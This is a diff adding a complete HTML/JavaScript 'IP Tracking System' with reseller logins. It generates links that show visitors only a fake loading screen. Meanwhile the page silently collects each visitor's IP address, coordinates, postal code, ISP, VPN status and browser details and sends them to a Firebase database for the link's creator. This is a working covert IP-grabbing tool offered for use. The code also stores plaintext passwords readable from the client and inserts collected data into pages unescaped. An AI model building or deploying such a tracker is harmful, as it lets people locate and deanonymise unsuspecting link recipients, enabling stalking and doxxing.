@@ -1,0 +1,900 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>IP Tracking System</title>
+    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-database-compat.js"></script>
+    <style>
+        :root {
+            --primary-color: #e53935;
+            --dark-color: #121212;
+            --darker-color: #0a0a0a;
+            --light-color: #f5f5f5;
+            --grey-color: #333;
+            --light-grey: #444;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background-color: var(--dark-color);
+            color: var(--light-color);
+            min-height: 100vh;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        header {
+            background-color: var(--darker-color);
+            padding: 15px 0;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.5);
+        }
+        
+        .header-content {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .logo {
+            font-size: 24px;
+            font-weight: bold;
+            color: var(--primary-color);
+        }
+        
+        .auth-buttons {
+            display: flex;
+            gap: 10px;
+        }
+        
+        .btn {
+            padding: 8px 16px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: all 0.3s ease;
+        }
+        
+        .btn-primary {
+            background-color: var(--primary-color);
+            color: white;
+        }
+        
+        .btn-primary:hover {
+            background-color: #c62828;
+        }
+        
+        .btn-outline {
+            background-color: transparent;
+            border: 1px solid var(--primary-color);
+            color: var(--primary-color);
+        }
+        
+        .btn-outline:hover {
+            background-color: var(--primary-color);
+            color: white;
+        }
+        
+        .user-info {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+        
+        .welcome-text {
+            color: var(--light-color);
+        }
+        
+        .admin-section {
+            margin-top: 30px;
+            background-color: var(--grey-color);
+            border-radius: 8px;
+            padding: 20px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
+        }
+        
+        .section-title {
+            font-size: 20px;
+            margin-bottom: 20px;
+            color: var(--primary-color);
+            border-bottom: 1px solid var(--light-grey);
+            padding-bottom: 10px;
+        }
+        
+        .form-group {
+            margin-bottom: 15px;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+        }
+        
+        .form-control {
+            width: 100%;
+            padding: 10px;
+            border-radius: 4px;
+            border: 1px solid var(--light-grey);
+            background-color: var(--darker-color);
+            color: var(--light-color);
+        }
+        
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 20px;
+        }
+        
+        th, td {
+            padding: 12px 15px;
+            text-align: left;
+            border-bottom: 1px solid var(--light-grey);
+        }
+        
+        th {
+            background-color: var(--darker-color);
+            color: var(--primary-color);
+        }
+        
+        tr:hover {
+            background-color: var(--light-grey);
+        }
+        
+        .action-buttons {
+            display: flex;
+            gap: 8px;
+        }
+        
+        .btn-sm {
+            padding: 5px 10px;
+            font-size: 12px;
+        }
+        
+        .btn-success {
+            background-color: #4caf50;
+            color: white;
+        }
+        
+        .btn-danger {
+            background-color: #f44336;
+            color: white;
+        }
+        
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.7);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .modal-content {
+            background-color: var(--grey-color);
+            padding: 20px;
+            border-radius: 8px;
+            width: 400px;
+            max-width: 90%;
+        }
+        
+        .modal-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+        
+        .close {
+            color: #aaa;
+            font-size: 24px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        
+        .close:hover {
+            color: white;
+        }
+        
+        .login-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 80vh;
+        }
+        
+        .login-form {
+            background-color: var(--grey-color);
+            padding: 30px;
+            border-radius: 8px;
+            width: 400px;
+            max-width: 90%;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
+        }
+        
+        .login-title {
+            text-align: center;
+            margin-bottom: 20px;
+            color: var(--primary-color);
+        }
+        
+        .loading-container {
+            text-align: center;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            flex-direction: column;
+        }
+        
+        .loading-text {
+            font-size: 24px;
+            color: var(--light-color);
+            margin-bottom: 20px;
+        }
+        
+        .dot {
+            display: inline-block;
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background-color: var(--primary-color);
+            margin: 0 5px;
+            animation: bounce 1.5s infinite;
+        }
+        
+        .dot:nth-child(2) {
+            animation-delay: 0.2s;
+        }
+        
+        .dot:nth-child(3) {
+            animation-delay: 0.4s;
+        }
+        
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-15px); }
+        }
+        
+        .visitor-info {
+            background-color: var(--grey-color);
+            padding: 20px;
+            border-radius: 8px;
+            margin-top: 20px;
+        }
+        
+        .info-item {
+            margin-bottom: 10px;
+            padding: 8px;
+            background-color: var(--darker-color);
+            border-radius: 4px;
+        }
+        
+        .info-label {
+            font-weight: bold;
+            color: var(--primary-color);
+        }
+        
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div id="app">
+        <!-- Header untuk Reseller -->
+        <header id="resellerHeader" class="hidden">
+            <div class="container header-content">
+                <div class="logo">IP Tracking Reseller</div>
+                <div id="authButtons" class="auth-buttons">
+                    <button class="btn btn-primary" onclick="showLoginModal()">Login Reseller</button>
+                </div>
+                <div id="userInfo" class="user-info" style="display: none;">
+                    <span class="welcome-text" id="welcomeText"></span>
+                    <button class="btn btn-outline" onclick="logout()">Logout</button>
+                </div>
+            </div>
+        </header>
+        
+        <!-- Halaman Login Reseller -->
+        <div id="loginPage" class="login-container hidden">
+            <div class="login-form">
+                <h2 class="login-title">Reseller Login</h2>
+                <div class="form-group">
+                    <label for="loginUsername">Username</label>
+                    <input type="text" id="loginUsername" class="form-control" placeholder="Masukkan username">
+                </div>
+                <div class="form-group">
+                    <label for="loginPassword">Password</label>
+                    <input type="password" id="loginPassword" class="form-control" placeholder="Masukkan password">
+                </div>
+                <button class="btn btn-primary" style="width: 100%;" onclick="login()">Login</button>
+            </div>
+        </div>
+        
+        <!-- Panel Reseller -->
+        <div id="resellerPage" class="container hidden">
+            <div class="admin-section">
+                <h2 class="section-title">Buat Link Tracking Baru</h2>
+                <button class="btn btn-primary" onclick="createTrackingLink()">Buat Link Baru</button>
+                <div id="newLink" class="form-group" style="margin-top: 15px; display: none;">
+                    <label>Link Tracking Baru:</label>
+                    <input type="text" id="trackingLink" class="form-control" readonly>
+                    <button class="btn btn-success" style="margin-top: 10px;" onclick="copyLink()">Salin Link</button>
+                </div>
+            </div>
+            
+            <div class="admin-section">
+                <h2 class="section-title">Daftar Link Tracking</h2>
+                <table id="linksTable">
+                    <thead>
+                        <tr>
+                            <th>Link ID</th>
+                            <th>Dibuat Pada</th>
+                            <th>Jumlah Pengunjung</th>
+                            <th>Aksi</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <!-- Data akan diisi secara dinamis -->
+                    </tbody>
+                </table>
+            </div>
+            
+            <div class="admin-section">
+                <h2 class="section-title">Data Pengunjung untuk: <span id="currentLinkTitle">Pilih link</span></h2>
+                <table id="visitorsTable">
+                    <thead>
+                        <tr>
+                            <th>IP Address</th>
+                            <th>Waktu</th>
+                            <th>Lokasi</th>
+                            <th>Aksi</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <!-- Data akan diisi secara dinamis -->
+                    </tbody>
+                </table>
+            </div>
+        </div>
+        
+        <!-- Halaman Loading untuk Pengunjung -->
+        <div id="visitorPage" class="loading-container hidden">
+            <div class="loading-text">Loading</div>
+            <div class="dots">
+                <span class="dot"></span>
+                <span class="dot"></span>
+                <span class="dot"></span>
+            </div>
+        </div>
+        
+        <!-- Modal untuk Detail Pengunjung -->
+        <div id="visitorModal" class="modal">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h2>Detail Pengunjung</h2>
+                    <span class="close" onclick="closeVisitorModal()">&times;</span>
+                </div>
+                <div id="visitorDetails" class="visitor-info">
+                    <!-- Detail pengunjung akan diisi di sini -->
+                </div>
+                <div class="action-buttons" style="margin-top: 20px;">
+                    <button class="btn btn-primary" onclick="downloadVisitorData()">Download sebagai TXT</button>
+                    <button class="btn btn-danger" onclick="deleteVisitorData()">Hapus Data</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Inisialisasi Firebase
+        const firebaseConfig = {
+            apiKey: "AIzaSyA_QzbdScTX2dLdu_VchsPH1JL-1tn3RcI",
+            authDomain: "chat-message-fcf6f.firebaseapp.com",
+            databaseURL: "https://chat-message-fcf6f-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "chat-message-fcf6f",
+            storageBucket: "chat-message-fcf6f.firebasestorage.app",
+            messagingSenderId: "137162503818",
+            appId: "1:137162503818:web:2c782da021738705e99f73",
+            measurementId: "G-V6NNC4148E"
+        };
+        
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+        
+        // Variabel global
+        let currentReseller = null;
+        let currentLinkId = null;
+        let currentVisitorKey = null;
+        
+        // Cek status halaman saat ini (pengunjung atau reseller)
+        window.onload = function() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const resellerId = urlParams.get('reseller');
+            const linkId = urlParams.get('link');
+            
+            if (resellerId && linkId) {
+                // Mode pengunjung
+                showVisitorPage();
+                collectAndSendData(resellerId, linkId);
+            } else {
+                // Mode reseller
+                showResellerHeader();
+                checkResellerLogin();
+            }
+        };
+        
+        // Tampilkan header reseller
+        function showResellerHeader() {
+            document.getElementById('resellerHeader').classList.remove('hidden');
+        }
+        
+        // Tampilkan halaman login
+        function showLoginPage() {
+            document.getElementById('loginPage').classList.remove('hidden');
+            document.getElementById('resellerPage').classList.add('hidden');
+        }
+        
+        // Tampilkan halaman reseller
+        function showResellerPage() {
+            document.getElementById('loginPage').classList.add('hidden');
+            document.getElementById('resellerPage').classList.remove('hidden');
+            loadResellerLinks();
+        }
+        
+        // Tampilkan halaman pengunjung
+        function showVisitorPage() {
+            document.getElementById('visitorPage').classList.remove('hidden');
+        }
+        
+        // Cek status login reseller
+        function checkResellerLogin() {
+            const savedReseller = localStorage.getItem('ipTrackingReseller');
+            if (savedReseller) {
+                try {
+                    const reseller = JSON.parse(savedReseller);
+                    // Verifikasi ke database
+                    database.ref('resellers/' + reseller.id).once('value')
+                        .then((snapshot) => {
+                            if (snapshot.exists()) {
+                                const resellerData = snapshot.val();
+                                // Cek expiry date
+                                if (new Date(resellerData.expiry) > new Date()) {
+                                    currentReseller = reseller;
+                                    showResellerPage();
+                                    document.getElementById('userInfo').style.display = 'flex';
+                                    document.getElementById('authButtons').style.display = 'none';
+                                    document.getElementById('welcomeText').textContent = `Halo, ${resellerData.username}`;
+                                } else {
+                                    localStorage.removeItem('ipTrackingReseller');
+                                    alert('Akun reseller Anda telah kedaluwarsa');
+                                    showLoginPage();
+                                }
+                            } else {
+                                localStorage.removeItem('ipTrackingReseller');
+                                showLoginPage();
+                            }
+                        })
+                        .catch((error) => {
+                            console.error('Error checking reseller:', error);
+                            showLoginPage();
+                        });
+                } catch (e) {
+                    console.error('Error parsing saved reseller:', e);
+                    localStorage.removeItem('ipTrackingReseller');
+                    showLoginPage();
+                }
+            } else {
+                showLoginPage();
+            }
+        }
+        
+        // Fungsi login reseller
+        function login() {
+            const username = document.getElementById('loginUsername').value;
+            const password = document.getElementById('loginPassword').value;
+            
+            if (!username || !password) {
+                alert('Username dan password harus diisi');
+                return;
+            }
+            
+            // Cari reseller di database
+            database.ref('resellers').orderByChild('username').equalTo(username).once('value')
+                .then((snapshot) => {
+                    if (snapshot.exists()) {
+                        let resellerData = null;
+                        let resellerId = null;
+                        
+                        snapshot.forEach((childSnapshot) => {
+                            resellerId = childSnapshot.key;
+                            resellerData = childSnapshot.val();
+                        });
+                        
+                        // Verifikasi password
+                        if (resellerData.password === password) {
+                            // Cek expiry date
+                            if (new Date(resellerData.expiry) > new Date()) {
+                                currentReseller = {
+                                    id: resellerId,
+                                    username: username
+                                };
+                                
+                                // Simpan ke localStorage
+                                localStorage.setItem('ipTrackingReseller', JSON.stringify(currentReseller));
+                                
+                                // Update UI
+                                document.getElementById('userInfo').style.display = 'flex';
+                                document.getElementById('authButtons').style.display = 'none';
+                                document.getElementById('welcomeText').textContent = `Halo, ${username}`;
+                                
+                                showResellerPage();
+                            } else {
+                                alert('Akun reseller Anda telah kedaluwarsa');
+                            }
+                        } else {
+                            alert('Password salah');
+                        }
+                    } else {
+                        alert('Username tidak ditemukan');
+                    }
+                })
+                .catch((error) => {
+                    console.error('Error during login:', error);
+                    alert('Terjadi kesalahan saat login');
+                });
+        }
+        
+        // Fungsi logout
+        function logout() {
+            currentReseller = null;
+            localStorage.removeItem('ipTrackingReseller');
+            document.getElementById('userInfo').style.display = 'none';
+            document.getElementById('authButtons').style.display = 'flex';
+            document.getElementById('loginUsername').value = '';
+            document.getElementById('loginPassword').value = '';
+            showLoginPage();
+        }
+        
+        // Buat link tracking baru
+        function createTrackingLink() {
+            if (!currentReseller) {
+                alert('Anda harus login terlebih dahulu');
+                return;
+            }
+            
+            const linkId = generateLinkId();
+            const linkData = {
+                createdAt: new Date().toISOString(),
+                resellerId: currentReseller.id
+            };
+            
+            // Simpan ke database
+            database.ref(`resellers/${currentReseller.id}/links/${linkId}`).set(linkData)
+                .then(() => {
+                    const trackingLink = `${window.location.origin}${window.location.pathname}?reseller=${currentReseller.id}&link=${linkId}`;
+                    document.getElementById('trackingLink').value = trackingLink;
+                    document.getElementById('newLink').style.display = 'block';
+                    loadResellerLinks();
+                })
+                .catch((error) => {
+                    console.error('Error creating tracking link:', error);
+                    alert('Terjadi kesalahan saat membuat link');
+                });
+        }
+        
+        // Generate ID unik untuk link
+        function generateLinkId() {
+            return Math.random().toString(36).substring(2, 10) + Math.random().toString(36).substring(2, 10);
+        }
+        
+        // Salin link ke clipboard
+        function copyLink() {
+            const linkInput = document.getElementById('trackingLink');
+            linkInput.select();
+            document.execCommand('copy');
+            alert('Link berhasil disalin');
+        }
+        
+        // Muat daftar link reseller
+        function loadResellerLinks() {
+            if (!currentReseller) return;
+            
+            database.ref(`resellers/${currentReseller.id}/links`).once('value')
+                .then((snapshot) => {
+                    const links = snapshot.val();
+                    const tableBody = document.querySelector('#linksTable tbody');
+                    tableBody.innerHTML = '';
+                    
+                    if (!links) {
+                        tableBody.innerHTML = '<tr><td colspan="4" style="text-align: center;">Belum ada link tracking</td></tr>';
+                        return;
+                    }
+                    
+                    Object.keys(links).forEach((linkId) => {
+                        const link = links[linkId];
+                        const row = document.createElement('tr');
+                        
+                        // Hitung jumlah pengunjung untuk link ini
+                        database.ref(`resellers/${currentReseller.id}/links/${linkId}/visitors`).once('value')
+                            .then((visitorSnapshot) => {
+                                const visitorCount = visitorSnapshot.exists() ? Object.keys(visitorSnapshot.val()).length : 0;
+                                
+                                row.innerHTML = `
+                                    <td>${linkId}</td>
+                                    <td>${new Date(link.createdAt).toLocaleDateString('id-ID')}</td>
+                                    <td>${visitorCount} pengunjung</td>
+                                    <td class="action-buttons">
+                                        <button class="btn btn-sm btn-primary" onclick="loadLinkVisitors('${linkId}')">Lihat Data</button>
+                                        <button class="btn btn-sm btn-danger" onclick="deleteLink('${linkId}')">Hapus</button>
+                                    </td>
+                                `;
+                                
+                                tableBody.appendChild(row);
+                            });
+                    });
+                })
+                .catch((error) => {
+                    console.error('Error loading links:', error);
+                });
+        }
+        
+        // Muat data pengunjung untuk link tertentu
+        function loadLinkVisitors(linkId) {
+            if (!currentReseller) return;
+            
+            currentLinkId = linkId;
+            document.getElementById('currentLinkTitle').textContent = linkId;
+            
+            database.ref(`resellers/${currentReseller.id}/links/${linkId}/visitors`).once('value')
+                .then((snapshot) => {
+                    const visitors = snapshot.val();
+                    const tableBody = document.querySelector('#visitorsTable tbody');
+                    tableBody.innerHTML = '';
+                    
+                    if (!visitors) {
+                        tableBody.innerHTML = '<tr><td colspan="4" style="text-align: center;">Belum ada pengunjung</td></tr>';
+                        return;
+                    }
+                    
+                    Object.keys(visitors).forEach((visitorKey) => {
+                        const visitor = visitors[visitorKey];
+                        const row = document.createElement('tr');
+                        
+                        row.innerHTML = `
+                            <td>${visitor.ip}</td>
+                            <td>${new Date(visitor.timestamp).toLocaleString('id-ID')}</td>
+                            <td>${visitor.country}, ${visitor.city}</td>
+                            <td class="action-buttons">
+                                <button class="btn btn-sm btn-primary" onclick="showVisitorDetails('${visitorKey}')">Detail</button>
+                                <button class="btn btn-sm btn-danger" onclick="deleteVisitor('${visitorKey}')">Hapus</button>
+                            </td>
+                        `;
+                        
+                        tableBody.appendChild(row);
+                    });
+                })
+                .catch((error) => {
+                    console.error('Error loading visitors:', error);
+                });
+        }
+        
+        // Hapus link tracking
+        function deleteLink(linkId) {
+            if (!confirm(`Apakah Anda yakin ingin menghapus link ${linkId}? Semua data pengunjung juga akan dihapus.`)) {
+                return;
+            }
+            
+            database.ref(`resellers/${currentReseller.id}/links/${linkId}`).remove()
+                .then(() => {
+                    alert('Link berhasil dihapus');
+                    loadResellerLinks();
+                    
+                    // Jika link yang sedang dilihat dihapus, kosongkan tabel pengunjung
+                    if (currentLinkId === linkId) {
+                        currentLinkId = null;
+                        document.getElementById('currentLinkTitle').textContent = 'Pilih link';
+                        document.querySelector('#visitorsTable tbody').innerHTML = '';
+                    }
+                })
+                .catch((error) => {
+                    console.error('Error deleting link:', error);
+                    alert('Terjadi kesalahan saat menghapus link');
+                });
+        }
+        
+        // Hapus data pengunjung
+        function deleteVisitor(visitorKey) {
+            if (!currentReseller || !currentLinkId) return;
+            
+            if (!confirm('Apakah Anda yakin ingin menghapus data pengunjung ini?')) {
+                return;
+            }
+            
+            database.ref(`resellers/${currentReseller.id}/links/${currentLinkId}/visitors/${visitorKey}`).remove()
+                .then(() => {
+                    alert('Data pengunjung berhasil dihapus');
+                    loadLinkVisitors(currentLinkId);
+                })
+                .catch((error) => {
+                    console.error('Error deleting visitor:', error);
+                    alert('Terjadi kesalahan saat menghapus data pengunjung');
+                });
+        }
+        
+        // Tampilkan detail pengunjung
+        function showVisitorDetails(visitorKey) {
+            if (!currentReseller || !currentLinkId) return;
+            
+            currentVisitorKey = visitorKey;
+            
+            database.ref(`resellers/${currentReseller.id}/links/${currentLinkId}/visitors/${visitorKey}`).once('value')
+                .then((snapshot) => {
+                    const visitor = snapshot.val();
+                    
+                    let detailsHTML = `
+                        <div class="info-item"><span class="info-label">IP Address:</span> ${visitor.ip}</div>
+                        <div class="info-item"><span class="info-label">Lokasi:</span> ${visitor.country}, ${visitor.city}, ${visitor.region} ${visitor.postal}</div>
+                        <div class="info-item"><span class="info-label">Koordinat:</span> ${visitor.latitude}, ${visitor.longitude}</div>
+                        <div class="info-item"><span class="info-label">ISP:</span> ${visitor.isp}</div>
+                        <div class="info-item"><span class="info-label">Browser & OS:</span> ${visitor.userAgent}</div>
+                        <div class="info-item"><span class="info-label">Bahasa:</span> ${visitor.language}</div>
+                        <div class="info-item"><span class="info-label">Jenis Koneksi:</span> ${visitor.connectionType}</div>
+                        <div class="info-item"><span class="info-label">Reverse DNS:</span> ${visitor.reverseDNS}</div>
+                        <div class="info-item"><span class="info-label">Proxy/VPN:</span> ${visitor.vpn ? 'Ya' : 'Tidak'}</div>
+                        <div class="info-item"><span class="info-label">Waktu:</span> ${new Date(visitor.timestamp).toLocaleString('id-ID')}</div>
+                    `;
+                    
+                    document.getElementById('visitorDetails').innerHTML = detailsHTML;
+                    document.getElementById('visitorModal').style.display = 'flex';
+                })
+                .catch((error) => {
+                    console.error('Error loading visitor details:', error);
+                });
+        }
+        
+        // Tutup modal detail pengunjung
+        function closeVisitorModal() {
+            document.getElementById('visitorModal').style.display = 'none';
+            currentVisitorKey = null;
+        }
+        
+        // Download data pengunjung sebagai TXT
+        function downloadVisitorData() {
+            if (!currentReseller || !currentLinkId || !currentVisitorKey) return;
+            
+            database.ref(`resellers/${currentReseller.id}/links/${currentLinkId}/visitors/${currentVisitorKey}`).once('value')
+                .then((snapshot) => {
+                    const visitor = snapshot.val();
+                    
+                    let textData = `DATA PENGUNJUNG IP TRACKING\n`;
+                    textData += `============================\n\n`;
+                    textData += `IP Address: ${visitor.ip}\n`;
+                    textData += `Lokasi: ${visitor.country}, ${visitor.city}, ${visitor.region} ${visitor.postal}\n`;
+                    textData += `Koordinat: ${visitor.latitude}, ${visitor.longitude}\n`;
+                    textData += `ISP: ${visitor.isp}\n`;
+                    textData += `Browser & OS: ${visitor.userAgent}\n`;
+                    textData += `Bahasa: ${visitor.language}\n`;
+                    textData += `Jenis Koneksi: ${visitor.connectionType}\n`;
+                    textData += `Reverse DNS: ${visitor.reverseDNS}\n`;
+                    textData += `Proxy/VPN: ${visitor.vpn ? 'Ya' : 'Tidak'}\n`;
+                    textData += `Waktu: ${new Date(visitor.timestamp).toLocaleString('id-ID')}\n`;
+                    
+                    const blob = new Blob([textData], { type: 'text/plain' });
+                    const url = URL.createObjectURL(blob);
+                    const a = document.createElement('a');
+                    a.href = url;
+                    a.download = `visitor-data-${visitor.ip}.txt`;
+                    document.body.appendChild(a);
+                    a.click();
+                    document.body.removeChild(a);
+                    URL.revokeObjectURL(url);
+                })
+                .catch((error) => {
+                    console.error('Error downloading visitor data:', error);
+                });
+        }
+        
+        // Hapus data pengunjung dari modal
+        function deleteVisitorData() {
+            if (!currentReseller || !currentLinkId || !currentVisitorKey) return;
+            
+            if (!confirm('Apakah Anda yakin ingin menghapus data pengunjung ini?')) {
+                return;
+            }
+            
+            database.ref(`resellers/${currentReseller.id}/links/${currentLinkId}/visitors/${currentVisitorKey}`).remove()
+                .then(() => {
+                    alert('Data pengunjung berhasil dihapus');
+                    closeVisitorModal();
+                    loadLinkVisitors(currentLinkId);
+                })
+                .catch((error) => {
+                    console.error('Error deleting visitor:', error);
+                    alert('Terjadi kesalahan saat menghapus data pengunjung');
+                });
+        }
+        
+        // Fungsi untuk mendapatkan informasi IP (untuk mode pengunjung)
+        async function getIPInfo() {
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                return await response.json();
+            } catch (error) {
+                console.error('Error fetching IP info:', error);
+                return null;
+            }
+        }
+        
+        // Fungsi untuk mendeteksi VPN/Proxy
+        async function checkVPN(ip) {
+            try {
+                const response = await fetch(`https://ipapi.co/${ip}/proxy/`);
+                const data = await response.json();
+                return data.proxy || data.vpn || data.tor;
+            } catch (error) {
+                console.error('Error checking VPN:', error);
+                return false;
+            }
+        }
+        
+        // Fungsi utama untuk mengumpulkan dan mengirim data (mode pengunjung)
+        async function collectAndSendData(resellerId, linkId) {
+            const ipInfo = await getIPInfo();
+            if (!ipInfo) return;
+            
+            const isVPN = await checkVPN(ipInfo.ip);
+            
+            const userAgent = navigator.userAgent;
+            const language = navigator.language;
+            const platform = navigator.platform;
+            
+            const data = {
+                ip: ipInfo.ip,
+                country: ipInfo.country_name,
+                city: ipInfo.city,
+                region: ipInfo.region,
+                postal: ipInfo.postal,
+                isp: ipInfo.org,
+                userAgent: userAgent,
+                language: language,
+                os: platform,
+                vpn: isVPN,
+                latitude: ipInfo.latitude,
+                longitude: ipInfo.longitude,
+                reverseDNS: ipInfo.reverse || '',
+                connectionType: ipInfo.connection_type || '',
+                timestamp: new Date().toISOString(),
+                visitedPages: [window.location.href]
+            };
+            
+            // Simpan data ke Firebase
+            const refPath = `resellers/${resellerId}/links/${linkId}/visitors/${data.ip.replace(/\./g, '-')}`;
+            database.ref(refPath).set(data)
+                .then(() => {
+                    console.log('Data successfully sent to Firebase');
+                })
+                .catch((error) => {
+                    console.error('Error sending data to Firebase:', error);
+                });
+        }
+    </script>
+</body>
+</html>
